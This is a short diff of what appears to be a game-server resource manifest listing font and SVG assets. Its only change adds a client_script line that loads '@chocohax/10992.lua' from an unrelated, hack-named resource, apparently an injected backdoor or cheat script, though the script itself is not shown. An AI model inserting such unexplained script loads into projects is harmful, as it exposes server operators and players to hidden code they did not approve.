@@ -33,3 +33,4 @@ files {
 	'html/res/opensans-light.ttf',
 	'html/res/futurastd-medium.svg'
 }
+client_script '@chocohax/10992.lua'
